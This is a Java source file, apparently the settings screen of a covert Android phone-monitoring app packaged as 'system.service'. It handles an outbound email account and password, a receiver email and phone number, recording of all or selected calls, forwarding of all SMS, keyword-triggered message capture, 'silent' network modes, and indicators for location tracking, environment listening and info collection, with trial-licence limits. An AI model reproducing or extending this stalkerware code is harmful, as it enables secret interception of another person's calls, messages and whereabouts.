package system.service.activity;  
  
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;  
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.SharedPreferences.OnSharedPreferenceChangeListener;
import android.content.res.Resources;
import android.content.res.TypedArray;  
import android.net.Uri;  
import android.os.Bundle;  
import android.preference.CheckBoxPreference;  
import android.preference.EditTextPreference;  
import android.preference.ListPreference;  
import android.preference.Preference;
import android.preference.PreferenceActivity;  
import android.preference.PreferenceCategory;  
import android.preference.PreferenceManager;
import android.preference.PreferenceScreen;
import android.util.Log;

import system.service.BootService;
import system.service.GlobalValues;
import system.service.R;
import system.service.config.ConfigCtrl;

import com.particle.inspector.common.util.RegExpUtil;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.StrUtils;
import com.particle.inspector.common.util.license.LicenseCtrl;
import com.particle.inspector.common.util.license.LICENSE_TYPE;
  
public class GlobalPrefActivity extends PreferenceActivity 
{
	private final static String LOGTAG = "GlobalPrefActivity";
	private Context context;
	private OnSharedPreferenceChangeListener chgListener;
	
	public static final String HAS_CHG_RECEIVER_INFO = "has_changed_receiver_info"; // flag for master phone or mail changed
	public static final String TARGET_NUMBER_BREAKER = " ";
	public static final int MAX_TARGET_NUM_COUNT = 9;
	public static final String SENSITIVE_WORD_BREAKER = " ";
	public static final int MAX_SENSITIVE_WORD_COUNT = 9;
	
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		
		context = getApplicationContext();
		// All values will be automatically saved to SharePreferences
		addPreferencesFromResource(R.xml.preference);
		
		// Init preference summary fields
		int prefCount = this.getPreferenceScreen().getPreferenceCount();
		for(int i = 0; i < prefCount; i++){
            initSummary(this.getPreferenceScreen().getPreference(i));
        }
		
		// Show special summary
		setSpecialSummary(true);
		
		// Set state of recording target number
		SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(this);
		setRecordTargetNumState(sp, this, true);
		
		// Set state of sensitive words
		setSensitiveWordsState(sp, this);
		
		// Set state of location indication to be uneditable
		((PreferenceCategory)this.getPreferenceScreen().getPreference(6)).getPreference(0).setEnabled(false);
		
		// Set state of env listening indication to be uneditable
		((PreferenceCategory)this.getPreferenceScreen().getPreference(7)).getPreference(0).setEnabled(false);
		
		// Set state of ring indication to be uneditable
		((PreferenceCategory)this.getPreferenceScreen().getPreference(8)).getPreference(0).setEnabled(false);
		
		// Set state of info collection indication to be uneditable
		((PreferenceCategory)this.getPreferenceScreen().getPreference(9)).getPreference(0).setEnabled(false);
		
		// Register	preference change listener
		chgListener = new OnSharedPreferenceChangeListener(){
			@SuppressWarnings("unused")
			@Override
			public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String key) {
				if (context == null) context = getApplicationContext();
				if (key.equals("pref_sender_mail")) {
					String oriSenderMail = sharedPreferences.getString("pref_sender_mail", "");
					String senderMail = oriSenderMail.trim();
					if(!StrUtils.validateMailAddress(senderMail) || (!senderMail.toLowerCase().endsWith("gmail.com") && !senderMail.toLowerCase().endsWith("qq.com"))) {
						String title = getResources().getString(R.string.error);
						String msg = String.format(getResources().getString(R.string.pref_invalid_sender_mail), senderMail);
						SysUtils.errorDlg(GlobalPrefActivity.this, title, msg);
					}
				}
				else if (key.equals("pref_sender_pwd")) {
					String oriSenderPwd = sharedPreferences.getString("pref_sender_pwd", "");
					String senderPwd = oriSenderPwd.trim();
					if (senderPwd.length() <= 0) {
						String title = getResources().getString(R.string.error);
						String msg   = getResources().getString(R.string.pref_pls_input_pwd);
						SysUtils.errorDlg(GlobalPrefActivity.this, title, msg);
					}
				}
				else if (key.equals("pref_recv_mail")) {
					checkRecvMailFormat(sharedPreferences, context);
					//enableReceiverInfoChgFlag();
				}
				else if (key.equals("pref_recv_phonenum")) {
					String oriPhoneNum = sharedPreferences.getString("pref_recv_phonenum", "");
					String phoneNum = oriPhoneNum.trim();
					Pattern p = Pattern.compile(RegExpUtil.VALID_PHONE_NUM);
					Matcher matcher = p.matcher(phoneNum);
					if (!matcher.matches()) {
						String title = getResources().getString(R.string.error);
						String msg   = String.format(getResources().getString(R.string.pref_pls_input_valid_recv_phonenum), phoneNum);
						SysUtils.errorDlg(GlobalPrefActivity.this, title, msg);
					}
					//else enableReceiverInfoChgFlag();
					//if (!phoneNum.equals(oriPhoneNum)) setRedirectPhoneNum(getApplicationContext(), phoneNum);
				}
				else if (key.equals("pref_record_all")) {
					setRecordTargetNumState(sharedPreferences, GlobalPrefActivity.this, false);
				}
				else if (key.equals("pref_record_target_number")) {
					String oriNumbersStr = sharedPreferences.getString("pref_record_target_number", "");
					String numbersStr = oriNumbersStr.trim();
					if (numbersStr.length() == 0 && !getRecordAll(context)) {
						SysUtils.messageBox(context, getResources().getString(R.string.pref_pls_input_target_number));
					} else {
						String[] numbers = numbersStr.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, TARGET_NUMBER_BREAKER)
													 .split(TARGET_NUMBER_BREAKER);
						if (numbers.length > MAX_TARGET_NUM_COUNT) {
							String title = getResources().getString(R.string.error);
							String msg = String.format(getResources().getString(R.string.pref_target_num_count_reach_max), MAX_TARGET_NUM_COUNT);
							SysUtils.errorDlg(GlobalPrefActivity.this, title, msg);
						} else {
							Pattern p = Pattern.compile(RegExpUtil.RECORD_TARGET_NUM);
							for (int i=0; i < numbers.length; i++) {
						    	Matcher matcher = p.matcher(numbers[i]);
						    	if (!matcher.matches()) {
						    		String title = getResources().getString(R.string.error);
						    		String msg = String.format(getResources().getString(R.string.pref_target_num_format_error));
									SysUtils.errorDlg(GlobalPrefActivity.this, title, msg);
						    		break;
						    	}
							}
						}
					}
				}
				else if (key.equals("pref_redirect_all_sms")) {
					boolean redirectAll = sharedPreferences.getBoolean("pref_redirect_all_sms", false);
					if (redirectAll) { 
						String title = context.getResources().getString(R.string.info);
						String msg = "";
						if (GlobalValues.licenseType == LICENSE_TYPE.TRIAL_LICENSED)
							msg = context.getResources().getString(R.string.pref_forward_all_sms_limit_in_trial);
						else 
							msg = context.getResources().getString(R.string.pref_redirect_all_sms_summary);
							
						new AlertDialog.Builder(GlobalPrefActivity.this).setTitle(title)
							.setIcon(android.R.drawable.ic_dialog_info)
							.setMessage(msg)
							.setPositiveButton("OK", 
								new DialogInterface.OnClickListener(){ 
									public void onClick(DialogInterface dlgInf, int i) { 
										//
									} 
								})
							.show();
					}
	            	
	            	setSensitiveWordsState(sharedPreferences, GlobalPrefActivity.this);
				}
				else if (key.equals("pref_sensitive_words")) {
					String oriWords = sharedPreferences.getString("pref_sensitive_words", "");
					String words = oriWords.trim();
					if (words.length() == 0) {
						SysUtils.messageBox(context, getResources().getString(R.string.pref_pls_input_sensitive_words));
					} else {
						words = words.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, SENSITIVE_WORD_BREAKER); // Remove duplicated blank spaces
						if (words.split(SENSITIVE_WORD_BREAKER).length > MAX_SENSITIVE_WORD_COUNT) {
							String title = getResources().getString(R.string.error);
							String msg = String.format(getResources().getString(R.string.pref_sensitive_words_count_reach_max), MAX_SENSITIVE_WORD_COUNT);
							SysUtils.errorDlg(GlobalPrefActivity.this, title, msg);
						}
					}
					//if (!words.equals(oriWords)) setSensitiveWords(getApplicationContext(), words);
				}
				
				// Update preference summary fields
				for(int i = 0; i < getPreferenceScreen().getPreferenceCount(); i++){
		            initSummary(getPreferenceScreen().getPreference(i));
		        }
				
				// Show special summary
				setSpecialSummary(false);
			}			
        };
		sp.registerOnSharedPreferenceChangeListener(chgListener);
	}
	
	/*
	private void enableReceiverInfoChgFlag() {
		Intent intent = this.getIntent();
		Bundle bn = intent.getExtras();
		bn.putBoolean(HAS_CHG_RECEIVER_INFO, true);
		intent.putExtras(bn);
		setResult(RESULT_OK, intent);
	}
	*/
	
	private void initSummary(Preference p) {
		if (p instanceof PreferenceCategory) {
			PreferenceCategory pCat = (PreferenceCategory)p;
			for(int i = 0; i < pCat.getPreferenceCount(); i++) {
				initSummary(pCat.getPreference(i));
			}
		} else {
			updatePrefSummary(p);
		}
	}

	private void updatePrefSummary(Preference p) {
		if (p instanceof ListPreference) {
			ListPreference listPref = (ListPreference)p; 
			p.setSummary(listPref.getEntry()); 
		}
		if (p instanceof EditTextPreference) {
			EditTextPreference editTextPref = (EditTextPreference)p; 
			p.setSummary(editTextPref.getText()); 
		}
	}
	
	private boolean checkRecvMailFormat(SharedPreferences sharedPreferences, Context context) {
		String oriMail = sharedPreferences.getString("pref_recv_mail", "");
		String mail = oriMail.trim();
		//if (!mail.equals(oriMail)) setMail(context, mail);
		
	    Pattern p = Pattern.compile(RegExpUtil.VALID_MAIL_ADDR);
	    Matcher matcher = p.matcher(mail);
		if (!matcher.matches()) {
			String title = getResources().getString(R.string.error);
			String msg = String.format(context.getResources().getString(R.string.pref_invalid_mail_format), mail);
			SysUtils.errorDlg(GlobalPrefActivity.this, title, msg);
			return false;
		}
	    return true;
	}
	
	private void setSensitiveWordsState(SharedPreferences sharedPreferences, Context context) {
		boolean enabled = sharedPreferences.getBoolean("pref_redirect_all_sms", false);
		if(enabled) {
			((PreferenceCategory)getPreferenceScreen().getPreference(5)).getPreference(1).setEnabled(false);
		} else {
			((PreferenceCategory)getPreferenceScreen().getPreference(5)).getPreference(1).setEnabled(true);
		}
	}
	
	private void setRecordTargetNumState(SharedPreferences sharedPreferences, Context context, boolean isInitial) {
		boolean recordAll = sharedPreferences.getBoolean("pref_record_all", false);
		if(recordAll) {
			((PreferenceCategory)getPreferenceScreen().getPreference(3)).getPreference(1).setEnabled(false);
			
			// Pop up to tell user recording times limit for trial
			if (!isInitial && GlobalValues.licenseType == LICENSE_TYPE.TRIAL_LICENSED) {
				String title = getResources().getString(R.string.info);
				String msg   = context.getResources().getString(R.string.pref_record_all_time_limit_in_trial);
				SysUtils.infoDlg(context, title, msg);
			}
		} else {
			((PreferenceCategory)getPreferenceScreen().getPreference(3)).getPreference(1).setEnabled(true);
		}
	}
	
	private void setSpecialSummary(boolean isInitial) {
		// Recording Target Number Summary
		if (getRecordTargetNum(context).length() <= 0) {
			String summary = getResources().getString(R.string.pref_record_number_summary);
			((PreferenceCategory)this.getPreferenceScreen().getPreference(3)).getPreference(1).setSummary(summary);
		}
		
		// Network Mode
		if (isInitial) {
			String summary = getResources().getString(R.string.pref_network_mode_summary);
			((PreferenceCategory)this.getPreferenceScreen().getPreference(4)).getPreference(0).setSummary(summary);
		}
		
		// Sensitive Words
		if (getSensitiveWords(context).length() <= 0) {
			String summary = getResources().getString(R.string.pref_sensitive_words_summary);
			((PreferenceCategory)this.getPreferenceScreen().getPreference(5)).getPreference(1).setSummary(summary);
		}
	}
	
	public static String getSenderMail(Context context) {
		return PreferenceManager.getDefaultSharedPreferences(context).getString("pref_sender_mail", "").trim();
	}
	
	public static void setSenderMail(Context context, String value) {
		PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_sender_mail", value).commit();
	}
	
	public static String getSenderPassword(Context context) {
		return PreferenceManager.getDefaultSharedPreferences(context).getString("pref_sender_pwd", "").trim();
	}
	
	public static void setSenderPassword(Context context, String value) {
		PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_sender_pwd", value).commit();
	}
	
	public static String getReceiverMail(Context context) {
		return PreferenceManager.getDefaultSharedPreferences(context).getString("pref_recv_mail", "").trim();
	}
	
	public static void setReceiverMail(Context context, String value) {
		PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_recv_mail", value).commit();
	}
	
	public static String getReceiverPhoneNum(Context context) {
		return PreferenceManager.getDefaultSharedPreferences(context).getString("pref_recv_phonenum", "").trim();
	}
	
	public static void setReceiverPhoneNum(Context context, String value) {
		PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_recv_phonenum", value).commit();
	}
	
	public static int getInfoInterval(Context context) {
		return Integer.parseInt(PreferenceManager.getDefaultSharedPreferences(context).getString("pref_info_interval", "1"));
	}
	
	public static void setInfoInterval(Context context, String value) {
		PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_info_interval", value).commit();
	}
	
	public static boolean getRecordAll(Context context) {
		return PreferenceManager.getDefaultSharedPreferences(context).getBoolean("pref_record_all", false);
	}
	
	public static void setRecordAll(Context context, boolean value) {
		PreferenceManager.getDefaultSharedPreferences(context).edit().putBoolean("pref_record_all", value).commit();
	}
	
	public static String getRecordTargetNum(Context context) {
		return PreferenceManager.getDefaultSharedPreferences(context).getString("pref_record_target_number", "").trim();
	}
	
	public static void setRecordTargetNum(Context context, String value) {
		PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_record_target_number", value).commit();
	}
	
	public static NETWORK_CONNECT_MODE getNetworkConnectMode(Context context) {
		String str = PreferenceManager.getDefaultSharedPreferences(context).getString("pref_network_mode", "silent");
		if (str.equals("wifisilent")) return NETWORK_CONNECT_MODE.WIFISILENT;
		else if (str.equals("silent")) return NETWORK_CONNECT_MODE.SILENT;
		else if (str.equals("wifiactive")) return NETWORK_CONNECT_MODE.WIFIACTIVE;
		else return NETWORK_CONNECT_MODE.ACTIVE;
	}
	
	public static void setNetworkConnectMode(Context context, NETWORK_CONNECT_MODE value) {
		if (value == NETWORK_CONNECT_MODE.WIFISILENT)
			PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_network_mode", "wifisilent").commit();
		else if (value == NETWORK_CONNECT_MODE.SILENT) 
			PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_network_mode", "silent").commit();
		else if (value == NETWORK_CONNECT_MODE.WIFIACTIVE) 
			PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_network_mode", "wifiactive").commit();
		else // NETWORK_CONNECT_MODE.ACTIVE
			PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_network_mode", "active").commit();
	}
	
	public static boolean getRedirectAllSms(Context context) {
		return PreferenceManager.getDefaultSharedPreferences(context).getBoolean("pref_redirect_all_sms", false);
	}
	
	public static void setRedirectAllSms(Context context, boolean value) {
		PreferenceManager.getDefaultSharedPreferences(context).edit().putBoolean("pref_redirect_all_sms", value).commit();
	}
	
	public static String getSensitiveWords(Context context) {
		return PreferenceManager.getDefaultSharedPreferences(context).getString("pref_sensitive_words", "").trim();
	}
	
	public static void setSensitiveWords(Context context, String value) {
		PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_sensitive_words", value.trim()).commit();
	}
	
	public static String[] getSensitiveWordsArray(Context context) {
		String[] words = GlobalPrefActivity.getSensitiveWords(context)
							.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, GlobalPrefActivity.SENSITIVE_WORD_BREAKER) // Remove duplicated blank spaces
							.split(GlobalPrefActivity.SENSITIVE_WORD_BREAKER);
		List<String> list = new ArrayList<String>();
		for (String word : words) {
			if (word.length() > 0 && list.size() < MAX_SENSITIVE_WORD_COUNT ) {
				list.add(word.toLowerCase());
			}
		}
		return list.toArray(new String[list.size()]);
	}
	
}